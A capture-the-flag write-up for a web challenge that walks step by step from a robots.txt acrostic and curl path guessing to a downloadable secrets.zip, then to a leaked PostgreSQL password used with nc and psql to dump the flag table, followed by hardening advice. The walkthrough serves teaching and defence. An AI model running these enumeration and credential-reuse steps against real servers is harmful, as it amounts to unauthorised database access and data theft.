# TL;DR (the outcome)

- Found `robots.txt` that contained a hidden acrostic which pointed to `secrets.zip`.
    
- Downloaded `secrets.zip`, extracted a file that contained a PostgreSQL connection string with credentials.
    
- Verified PostgreSQL port open, connected as `olwen`, enumerated tables and read `super_secret` → **flag**:  
    `safctf{585e-e9a8-e119-4d54-8974-efa2-2a03-ef41}`
    

---

# Step‑by‑step (what I ran and why)

1. **Fetch the webpage** (baseline reconnaissance)
    
    `curl -i http://54.72.82.22:8029/`
    
    - Confirmed site is up and saw the HTML title “Strings attached” and an obvious link text `secret` (but no `href`). That suggested something textual/hiding.
        
2. **Check robots.txt** — common place CTF authors hide hints
    
    `curl -i http://54.72.82.22:8029/robots.txt`
    
    - `200 OK` and a long story text. This screamed steganography/acrostic, so we inspected first/last characters.
        
3. **Extract first characters (acrostic)** to see hidden letters
    
    `curl -s http://54.72.82.22:8029/robots.txt | sed '/^$/d' | cut -c1 | tr -d '\n'; echo # Output: ##LIBNOIOROFA  (raw)`
    
    - Also printed line-numbered text to map letters to lines and confirmed letters spelled `LIBNOIOROFA` and variants when grouping evens/odds.
        
4. **Tried several candidate paths** derived from the acrostic + story:
    
    `for p in olwen riann river wishes "river-of-wishes" secrets whispers serene vale owl lib lib/noir lib/noir/ofa libnoiorofa libnoiorofa.txt secret.txt secrets.txt secrets.zip ... ; do   curl -s -I -w "%{http_code} %{url_effective}\n" -o /dev/null "http://54.72.82.22:8029/$p"; done`
    
    - Found `200` on `/secrets.zip`.
        
5. **Download the ZIP and inspect** — careful about write errors, used /tmp
    
    `curl -sS -D - -o /tmp/secrets.zip http://54.72.82.22:8029/secrets.zip ls -lh /tmp/secrets.zip file /tmp/secrets.zip unzip -l /tmp/secrets.zip`
    
    - `secrets.zip` present, listing showed a file named `secrets` inside.
        
6. **Read the `secrets` file directly from the zip**
    
    `unzip -p /tmp/secrets.zip secrets`
    
    - Output contained a Postgres datasource block:
        
        `datasource db {   provider = "postgresql"   url = "postgresql://olwen:Olwen+SereneVale#2024@localhost:8032/olwendb?schema=public" }`
        
    - That’s a full connection string: user `olwen`, password `Olwen+SereneVale#2024`, host `localhost`, port `8032`, database `olwendb`.
        
7. **Check if the DB port is reachable**
    
    `nc -vz 54.72.82.22 8032`
    
    - Port `8032` was open.
        
8. **Connect to Postgres remotely using the creds**
    
    `PGPASSWORD='Olwen+SereneVale#2024' psql -h 54.72.82.22 -p 8032 -U olwen -d olwendb -c '\dt'`
    
    - Found tables: `super_secret`, `users`.
        
9. **Dump the `super_secret` table**
    
    `PGPASSWORD='Olwen+SereneVale#2024' psql -h 54.72.82.22 -p 8032 -U olwen -d olwendb -c "SELECT * FROM super_secret;"`
    
    - Row returned:
        
        `safctf{585e-e9a8-e119-4d54-8974-efa2-2a03-ef41}`
        
    - That’s the flag.
        

---

# Why these steps worked (vulnerability chain)

1. **Information disclosure in `robots.txt`** — instead of listing blocked paths, it contained a long story with an acrostic/hint. CTF authors often hide hints in innocuous files; sometimes admins mistakenly publish secrets there.
    
2. **Sensitive file accessible on web root** — `secrets.zip` was accessible and contained plaintext secrets.
    
3. **Secrets in repo/zip** — the zip contained production-like DB credentials. Those credentials allowed direct DB access.
    
4. **DB reachable from public IP** — Postgres was listening on a network interface reachable from the attacker machine, not limited to localhost or protected by firewall rules.
    

---

# Tools used

- `curl` — fetch pages and files
    
- `sed`, `awk`, `cut` — extract characters / craft acrostic checks
    
- `gobuster` — directory brute force (helpful but not necessary here after robots hint)
    
- `unzip` — inspect zip content and stream file
    
- `nc` — check port open
    
- `psql` — Postgres client to connect and query
    

---

# How to fix / harden (remediation)

**Short checklist (prioritize these):**

1. **Remove secrets from the webroot** — delete any `.zip`, `.env`, or config files that contain credentials from publicly accessible directories.
    
2. **Avoid storing secrets in VCS or deployed assets** — use a secrets manager (Vault, AWS Secrets Manager, etc.) or environment variables set on the host, not in files under the webroot.
    
3. **Protect `robots.txt` contents** — do not use `robots.txt` to store any hint or confidential info. It’s public by design.
    
4. **Block direct DB exposure**:
    
    - Configure Postgres to bind only to `127.0.0.1` (or better, a private network) and not the public interface.
        
    - Use firewall rules/security group to restrict access to DB port to only known hosts (app servers) — e.g., `ufw` or cloud SGs.
        
    - Require strong authentication and rotate credentials if leaked.
        
5. **Audit and rotate credentials** — whenever a secret is exposed, rotate it immediately and check for unauthorised access.
    
6. **Server-status & sensitive endpoints** — restrict `/server-status` with `Require ip` or disable it in production.
    
7. **CI/CD / Build process** — ensure artifacts (zips) do not include config files with secrets. Add checks to pipeline to fail if secrets are found.
    
8. **Monitoring and detection** — enable logging/alerts for new files or unusual DB connections.
    

**Specific config actions (examples)**:

- In `postgresql.conf`:
    
    `listen_addresses = '127.0.0.1'`
    
- In firewall (example using `ufw`):
    
    `ufw deny 8032 # or allow only specific IPs ufw allow from 10.0.0.5 to any port 8032`
    
- Remove file and commit:
    
    `rm /var/www/html/secrets.zip # rotate db password and update app config to use new secret manager`
    

---

# Defensive lessons & CTF notes (for revision)

- Always check `robots.txt`, `sitemap.xml`, and the HTML source for weird hints. CTF authors/ops hide clues there.
    
- Acrostics: check first and last characters of lines when the content looks like a story — common stego technique.
    
- If a resource is found (zip, tar, backup), always inspect inside with `unzip -l` or `tar -tf` and `unzip -p`/`tar -xO` to avoid writing sensitive files to cwd.
    
- If you find credentials, test connectivity gracefully: `nc` then `psql` (or the appropriate client).
    
- Keep an eye on side-channel errors: `curl` write errors can be avoided by writing to `/tmp/` and checking `CURL_EXIT`.